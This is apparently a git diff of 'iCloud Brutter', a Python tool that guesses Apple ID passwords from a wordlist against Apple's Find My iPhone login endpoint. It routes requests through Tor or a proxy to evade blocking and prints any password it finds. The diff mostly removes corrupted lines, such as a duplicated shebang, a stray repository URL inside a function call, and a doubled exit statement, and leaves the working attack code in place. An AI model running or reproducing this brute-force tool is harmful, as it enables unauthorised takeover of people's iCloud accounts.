@@ -1,6 +1,4 @@
 #!/usr/bin/env python3
-
-!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 # Coded by Momo Outaadi (M4ll0k)
 
@@ -11,7 +9,6 @@ import plistlib
 import requests
 from requests import Session
 from requests.auth import HTTPBasicAuth 
-from requests.auth import HTTPBasicAuth
 
 class iCloudBrute(object):
     def __init__(self,kwargs):
@@ -23,7 +20,6 @@ class iCloudBrute(object):
     def tor(self):
         return 'socks5://127.0.0.1:9050'
     
-
     def banner(self):
         print(r"      _        ,..  ")
         print(r" ,--._\\_.--, (-00) iCloud Brutter v0.1.0")
@@ -32,7 +28,7 @@ class iCloudBrute(object):
         print(r":            :      ")
         print(r" '.___..___.`       ")
         print("                     ")
-
+    
     def usage(self):
         print("Usage: %s [options]\n"%(sys.argv[0]))
         print("\t--id\t\tApple ID")
@@ -45,7 +41,7 @@ class iCloudBrute(object):
         print("\t%s --id test@apple.com --wordlist pass.txt --tor"%(sys.argv[0]))
         print("\t%s --id test@apple.com --wordlist pass.txt --proxy 11.11.11.11\n"%(sys.argv[0]))
         exit()
-
+    
     def main(self):
         self.banner()
         tor = False;apple_id=None
@@ -83,14 +79,14 @@ class iCloudBrute(object):
                     if r is True:
                         print('[ + ] Found Password: %s for ID: %s'%(p,i))
                         break
-                    elif r is None:
+                    elif r is None: 
                         print('[ ! ] Blocked!!!')
         else: self.usage()
-
+    
     def check(self,apple_id,passwd,proxy,tor):
         proxies = {}
         if tor is True: proxies = {'http':self.tor,'https':self.tor}
-        if proxy != ('' or None): proxies = {'http':proxy,'https':proxy}
+        if proxy != ('' or None): proxies = {'http':proxy,'https':proxy} 
         url = ('https://fmipmobile.icloud.com/fmipservice/device/%s/initClient'%apple_id)
         headers = {
             'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_2 like Mac OS X)'
@@ -105,8 +101,7 @@ class iCloudBrute(object):
             )
         req = session.request(
             method = "POST",
-            url = url,	url = https://github.com/nathan4servs/iCloudBrutter-master.git
-
+            url = url,
             data = data,
             headers = headers,
             proxies = proxies,
@@ -115,10 +110,9 @@ class iCloudBrute(object):
         )
         if req.status_code == 330: return True
         elif req.status_code == 401: return False
-        else: return
+        else: return 
 if __name__ == "__main__":
     try:
         iCloudBrute(sys.argv[1:]).main()
     except KeyboardInterrupt:
-        exit(print("Exiting..."))        exit(print("Exiting..."))
         exit(print("Exiting..."))
